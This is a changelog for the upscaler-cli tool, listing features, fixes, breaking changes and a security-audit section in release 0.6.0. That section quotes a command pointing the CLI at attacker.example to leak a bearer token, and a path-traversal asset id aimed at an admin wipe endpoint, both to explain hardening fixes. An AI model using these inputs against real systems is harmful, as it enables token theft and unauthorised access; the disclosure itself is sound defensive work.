# Changelog

All notable changes to `upscaler-cli` will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Added

- `entry update --embed FIELD=PATH` uploads a file and appends it to a
  markdown text field as `![name](upscaler-file://...)` for an image or
  `[name](upscaler-file://...)` otherwise. On a record, `--task-id` names the
  task that owns the upload.
- `files upload --file PATH --asset-id ID [--ref-id ID]` uploads one file and
  prints that markdown reference; `files presign` accepts `--ref-id`. `--ref-id`
  needs an up-ai release that accepts `ref_id` on `/api/v1/files/presign`.

### Fixed

- **`entry update --file` and `entry upload-file` no longer drop a field's
  existing files.** Since up-ai answers `GET /api/v1/assets/{id}` with the
  overview wrapped in `json`, the CLI read an entry's current values as empty,
  so the upload replaced the field's files instead of appending to them (and
  the version check was skipped). The CLI now reads both response shapes.
- `upscaler login` reports a failed client registration or an unreachable
  server as one error line instead of a Python traceback.
- In `--json` mode, invalid `--data` for `entry create`, `entry update` and
  `entry save-draft` is reported as a JSON error on stderr, like every other
  error.

## [0.6.0] - 2026-10-01

### Security

Findings from a security audit of the CLI. No evidence any of these were
exploited; all are client-side hardening.

- **Stored tokens are now bound to the server that issued them.** The CLI
  previously attached the stored bearer token to whatever `server_url`
  resolved to, so `upscaler --server http://attacker.example list todos` — or
  a `$UPSCALER_SERVER` inherited from a poisoned environment — sent a
  production access token to a third party in plaintext. Requests to an origin
  other than the token's issuer are now refused before any connection is made.
  Point the CLI at a different server by logging in there, ideally under its
  own profile (`upscaler --profile staging login`).
- **Asset ids can no longer re-target a request.** Ids are interpolated into
  request paths (`/api/v1/assets/{asset_id}`), and httpx resolves `..`
  segments and splits on `?`/`#` when parsing the URL, so an id such as
  `d_x/../../../api/v1/admin/wipe` reached an endpoint the command never
  named. Request paths containing traversal, empty segments, a query, a
  fragment, or control characters are now rejected.
- **Credential files are 0600 from creation.** The token store wrote the
  ciphertext and salt under the ambient umask (typically 0644) and narrowed
  the mode afterwards, leaving a window where another local user could read
  them. Files are now created with the mode set. `config.json`, the pending
  device code, and files written by `upscaler files download` are 0600 too —
  downloaded evidence was previously world-readable.
- **Profile directory permissions are re-asserted on every write.**
  `mkdir(exist_ok=True)` silently accepted an existing directory's mode, so a
  tree left group- or world-readable stayed that way indefinitely.
- **`upscaler logout` now revokes the refresh token**, not just the access
  token, and deletes any unredeemed device code. RFC 7009 leaves cascading up
  to the server, so logout could previously leave a redeemable refresh token
  behind.
- **`upscaler files download --output` no longer follows a symlink.** A
  dangling symlink at the destination passed the overwrite guard and the
  download was written through it.
- **Insecure transport is now visible.** The CLI warns on stderr when a
  request would go over plaintext HTTP or with `verify_ssl false`. Both remain
  supported for local development.
- **Dependency floors raised** to `cryptography>=42.0.4` and `httpx>=0.27`;
  the previous `cryptography>=41.0` allowed known-vulnerable builds to satisfy
  the requirement.
- `SECURITY.md` now states plainly what the at-rest encryption does and does
  not protect against: the key is derived from a salt stored beside the
  ciphertext plus the hostname and username, none of which are secret, so it
  defends against casual disclosure and token reuse on another machine — not
  against a local attacker.

### Fixed

- **An expired token now refreshes even when the server does not answer 401.**
  Older up-ai servers return HTTP 200 with a `VALIDATION_ERROR` envelope
  ("Authentication required") for an unresolvable token on `/api/v1`, so the
  CLI's 401-only auto-refresh never fired and agents saw a retryable
  validation error. The client now also treats an `AUTHENTICATION_FAILED`
  envelope, or that legacy envelope, as an auth failure: it refreshes once and
  retries. When refresh fails, the message now says
  `Run: upscaler refresh (or upscaler login if refresh fails)`.

## [0.5.1] - 2026-09-30

### Changed

- `upscaler --version` now points at upscaler-skills `v1.2.0`, the release that documents
  `get --lane` and comma-separated `get --format`. 0.5.0 shipped still pinned to `v1.1.0`.

## [0.5.0] - 2026-09-30

### Added

- `todo create --description` and `todo update --description` set the todo body
  (markdown). The REST payload already accepted `data.description`; the CLI just
  never exposed it.
- `get --lane designer|published` selects which copy of a definition asset to read.
  Definition-backed assets exist twice under one id: a designer working copy and a
  published snapshot. Reads still default to published, and the response echoes
  `json.lane` so the answer always names the copy it came from. Use `designer`
  whenever the result feeds an edit back, since content writes target that copy.
- `get --format` now accepts several formats at once, either repeated
  (`--format json --format markdown`) or comma-separated (`--format json,schema`).
  Sections are labelled only when more than one is requested, so a single
  `--format markdown` still prints the bare body and stays pipeable.
- `get i_… --format markdown` renders register items, which previously returned
  nothing.

### Changed

- **Breaking:** `get to_…` routes to `/api/v1/assets` like every other asset prefix,
  so it returns the standard envelope with the todo under `data.json` instead of a
  bare object, and it honours `--format` and `--lane`. Scripts reading `data.id`
  should read `data.json.id`. `--type todo` still reaches the old endpoint and the
  old shape for one release.

### Deprecated

- `get --draft`, in favour of `--lane designer`. Passing both is now an error rather
  than silently answering with the designer copy.

## [0.4.0] - 2026-08-18

### Added

- **This CLI is now open source**, MIT-licensed, developed at
  <https://github.com/upscaler-io/upscaler-cli>. It was previously built in a
  private monorepo and released to PyPI as a binary only. Nothing about
  installation changes: `pip install upscaler-cli` is still the way in.
- Published package metadata now declares its license, supported Python
  versions, and project URLs, so the PyPI page links back to the source,
  issue tracker, and changelog.
- `SECURITY.md` documents the private disclosure process and exactly what the
  CLI writes to `~/.upscaler/`.

- **Agent interface parity (A093)**: new commands closing gaps that previously blocked end-to-end compliance workflows.
  - `upscaler recover <ASSET_ID> [--dry-run]` restores a soft-deleted asset. Prefix-routed to the right recover mutation (`d_`/`doc_`, `rg_`, `i_`, `r_`/`rec_`, `rd_`, `cd_`, `bd_`); other prefixes (e.g. `td_`) use the OWNER/ADMIN-gated trash fallback. `--dry-run` reports the detected type and target mutation without any call.
  - `upscaler list deleted [--search]` lists soft-deleted assets (recovery targets; OWNER/ADMIN).
  - `upscaler list members [--search] [--show-disabled] [--limit/--offset]` and `upscaler list groups` for assignee/mention discovery (OWNER/ADMIN).
  - `upscaler comment list --asset-id --asset-type [--context-id] [--limit/--offset]` and `upscaler comment add --asset-id --asset-type --content [--mention member::id ...]`. `asset_type` is restricted to `todo`/`release`; content is capped at 2000 chars; mentions are typed (`member::<id>` / `group::<id>`) and fire real notifications. Local validation fails fast before any HTTP call.
  - `upscaler files download --key --name [--bucket] (--output PATH | --stdout) [--force]` streams evidence file bytes to disk (8 KiB chunks); refuses to overwrite without `--force`. `upscaler files sign-get --key --name [--bucket]` prints a URL only. Both are AV-gated: an infected file is refused and a pending scan is deferred.

### Fixed

- `entry update --file "Table.Column=path"` now splices nested form-table file rows under the **bare** column id (`ff_col`) instead of the dotted composite (`ff_table.ff_col`). The backend schema endpoint reports a table column's key as `ff_table.ff_col` with a null `dataIndex`, but the persisted row and every UI renderer key cells by the bare `ff_col`; splicing under the dotted key uploaded the file yet left the row blank in the UI. The resolver now reduces the resolved column to its bare last segment (`_bare_col_key`) and matches a `Table.Column` path against either the dotted or bare form. Error hints list columns by their bare id. Regression-tested against a dotted-key schema fixture (`tests/test_cli/test_entry_upload.py::TestEntryUpdateDottedSchemaColumnKeys`). A matching fix to the backend's schema surface is planned separately; until it ships, the CLI accepts either form.

### Removed

- **Breaking**: The `upscaler skill-path` command and the bundled `SKILL.md` file have been removed. Agent skills for Upscaler are now published as a separate open-source repository at <https://github.com/upscaler-io/upscaler-skills>. Install the skill that matches your agent (Claude Code, Cursor, Gemini CLI, Codex CLI, etc.) per the instructions in that repo's README.

### Changed

- `upscaler --help` output now includes a footer linking to the agent-skills repository.
- `upscaler --version` now prints the recommended agent-skills git ref in addition to the CLI version, and that ref is pinned to the skills release `v1.1.0` instead of the floating `main` branch, so a given CLI version names a known-good skills version.
- **Internal**: the installed Python package is now `upscaler_cli` instead of the
  generic `src`, which previously squatted a very common top-level module name
  and could shadow or be shadowed by unrelated code in the same environment.
  The `upscaler` command, every flag, and all output are unchanged. This only
  affects anyone who imported the internals directly (`from src.client import
  ...` becomes `from upscaler_cli.client import ...`); that was never a
  supported interface.

### Migration

If you previously used `upscaler skill-path` to locate the bundled skill, install
the skills from their own repository instead. In Claude Code:

```
/plugin marketplace add upscaler-io/upscaler-skills
/plugin install upscaler-skills@upscaler
```

For Cursor, Gemini CLI, Codex, and ChatGPT, see the install matrix in
<https://github.com/upscaler-io/upscaler-skills#installation>.

## [0.3.0] - 2026-08-01

Released from the private monorepo, before this repository existed. Recorded retroactively because it contained a breaking change:

### Removed

- **Breaking**: `upscaler entry complete-task` was removed. The platform's agent surface is human-in-the-loop: agents stage task values with `upscaler entry save-draft --task-id <t_*> --note "..."` (added in the same release), and a human reviews and completes the task in the Upscaler app. A script calling `complete-task` now fails locally with `No such command 'complete-task'`; switch it to `save-draft` and report drafts, not completions.

Earlier releases (0.1.0 through 0.2.3) were also published from the private monorepo without a public changelog.
